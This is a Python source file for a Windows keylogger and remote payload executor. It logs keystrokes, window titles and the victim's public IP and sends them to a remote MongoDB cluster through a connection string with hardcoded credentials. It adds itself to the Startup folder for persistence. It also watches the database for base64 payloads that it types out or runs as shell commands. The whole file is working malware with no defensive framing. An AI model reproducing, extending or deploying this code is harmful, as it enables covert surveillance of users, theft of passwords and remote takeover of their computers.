import os
import sys
import platform
import socket
import threading
import base64
import wave
import logging
import datetime
import pygetwindow
import pymongo
import subprocess
import webbrowser
import time
import pyautogui
import requests
import win32com.client
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from cryptography.fernet import Fernet  

SEND_REPORT_EVERY = 30  # as in seconds

# <--MongoDB Connection-->
try:
    client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
    db = client["keylogger"]
    keylogs_collection = db["keylog"]
    payload_collection = db["payload"]
except pymongo.errors.ConnectionError as e:
    print(f"Failed to connect to MongoDB: {e}")

# <--Function to Fetch Public IP-->
def get_public_ip():
    try:
        # Fetch public IP from an API
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException as e:
        print(f"Failed to fetch public IP: {e}")
        return "Unknown IP"

# <--Function to start on boot-->
def add_to_startup():
    try:
        # Get the path to the user's Startup folder
        startup_folder = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")

        # Get the full path of the current executable
        exe_path = os.path.realpath(sys.argv[0])
        shortcut_path = os.path.join(startup_folder, f"{os.path.basename(exe_path)}.lnk")

        # Create a shortcut using win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()

        print(f"{os.path.basename(exe_path)} has been added to Startup successfully.")
    except Exception as e:
        print(f"Failed to add {os.path.basename(exe_path)} to Startup: {e}")

# <--Generate and Store a Key for AES Encryption-->
def generate_key():
    # return b"m0bvJQ1th6Y4T3Zeqz_An9XdyekAmBCMUNVOsXbQW1Q="
    return Fernet.generate_key()

# Use the key to create a Fernet cipher
encryption_key = generate_key()
cipher = Fernet(encryption_key)

# <--Function to Encrypt Data-->
def encrypt_data(data):
    return cipher.encrypt(data.encode())

# <--Function to Decrypt Data-->
def decrypt_data(data):
    return cipher.decrypt(data).decode()

# <--Keylogger Script-->
class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.public_ip = get_public_ip()  # Fetch public IP at the start

        logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(message)s] > %(message)s")
        
        # Generate a new encryption key for this instance
        self.encryption_key = generate_key()
        self.cipher = Fernet(self.encryption_key)  # Use self.cipher for encryption

    def on_press(self, key):
        try:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            active_window = pygetwindow.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown Window"
            key_pressed = key.char if hasattr(key, 'char') else str(key)

            # Encrypt data with the generated key
            encrypted_timestamp = base64.b64encode(self.cipher.encrypt(current_time.encode())).decode('utf-8')
            encrypted_public_ip = base64.b64encode(self.cipher.encrypt(self.public_ip.encode())).decode('utf-8')
            encrypted_window_title = base64.b64encode(self.cipher.encrypt(window_title.encode())).decode('utf-8')
            encrypted_key_pressed = base64.b64encode(self.cipher.encrypt(key_pressed.encode())).decode('utf-8')

            # Create the document structure, including the encryption key
            keylog_document = {
                "encryption_key": base64.b64encode(self.encryption_key).decode('utf-8'),
                "timestamp": encrypted_timestamp,
                "public_ip": encrypted_public_ip,
                "window_title": encrypted_window_title,
                "key_pressed": encrypted_key_pressed,
            }

            # Insert keylog into MongoDB collection
            keylogs_collection.insert_one(keylog_document)

        except AttributeError:
            logging.info(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')} [Unknown IP] > Unknown Window > {key}")

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time} [{self.public_ip}] > {window[0].title} > Mouse {button} clicked at ({x}, {y})")

    def on_move(self, x, y):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
        logging.info(f"{current_time} [{self.public_ip}] > Mouse moved to {x}, {y}")

    def on_scroll(self, x, y):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
        logging.info(f"{current_time} [{self.public_ip}] > Mouse scrolled to {x}, {y}")

    def report(self):
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with MouseListener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

# <--Payload Executor Script-->
def execute_command(command):
    try:
        if command.startswith("DELAY"):
            delay_time = int(command.split()[1]) / 1000.0
            time.sleep(delay_time)
        elif command.startswith("STRING"):
            string_to_type = command.split("STRING ")[1].strip()
            pyautogui.typewrite(string_to_type)
        elif command.startswith("ENTER"):
            pyautogui.press('enter')
        elif command.startswith("GUI"):
            gui_key = command.split()[1].lower()
            if gui_key == "r":
                pyautogui.hotkey('win', 'r')
            elif gui_key == "l":
                pyautogui.hotkey('win', 'l')
            else:
                print("Unsupported GUI key:", gui_key)
        elif command.startswith("MENU"):
            pyautogui.press('menu')
        elif command.startswith("CTRL"):
            ctrl_key = command.split()[1].lower()
            pyautogui.hotkey('ctrl', ctrl_key)
        elif command.startswith("ALT"):
            alt_key = command.split()[1].lower()
            pyautogui.hotkey('alt', alt_key)
        elif command.startswith("SHIFT"):
            shift_key = command.split()[1].lower()
            pyautogui.hotkey('shift', shift_key)
        elif command.startswith("REM") or command.startswith("//"):
            # Ignore comments
            pass
        elif command.startswith("EXECUTE:"):
            file_path = command.split(":")[1].strip()
            subprocess.Popen(file_path, shell=True)
        elif command.startswith("BROWSE:"):
            url = command.split(":")[1].strip()
            webbrowser.open(url)
        elif command.startswith("CUSTOM:"):
            custom_command = command.split(":")[1].strip()
            # Add more custom command handling here as needed
        else:
            # Invalid command
            print("Invalid command:", command)
    except Exception as e:
        print("Error executing command:", e)
        logging.error(f"Error executing command '{command}': {e}")

def store_and_execute_payload():
    try:
        # Create a change stream to watch for inserts into the payload collection
        with payload_collection.watch([{'$match': {'operationType': 'insert'}}]) as stream:
            print("Listening for new payloads...")
            for change in stream:
                # Get the full document inserted
                document = change['fullDocument']
                
                # Check if the document contains the expected key
                if "text" in document:
                    # Get the base64 encoded text content from the document
                    encoded_payload = document["text"]
                    
                    # Decode the base64 encoded payload to clear text
                    decoded_payload = base64.b64decode(encoded_payload).decode('utf-8')
                    print("Payload decoded from base64.")

                    # Execute the decoded payload immediately
                    execute_payload(decoded_payload)

                    # Optionally, delete the document from the collection after execution
                    payload_collection.delete_one({"_id": document["_id"]})
                    print("Payload document deleted from MongoDB.")
                else:
                    print("Document does not contain the 'text' key.")

    except pymongo.errors.PyMongoError as e:
        print(f"Error in MongoDB change stream: {e}")
    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Stopping execution...")


def execute_payload(payload_text):
    try:
        if payload_text:
            print("Executing payload...")
            for line in payload_text.split('\n'):
                execute_command(line.strip())
            print("Payload executed successfully.")
        else:
            print("Payload text is empty.")
    except Exception as e:
        print("Error executing payload:", e)


# <--Executor Script-->
def run_keylogger():
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()

def execute_payload_script():
    store_and_execute_payload()

# <--Run both Keylogger and Payload Executor-->
if __name__ == '__main__':
    # Ensure the executable adds itself to startup
    add_to_startup()

    # Start the keylogger and payload executor
    keylogger_thread = threading.Thread(target=run_keylogger)
    payload_thread = threading.Thread(target=execute_payload_script)

    keylogger_thread.start()
    payload_thread.start()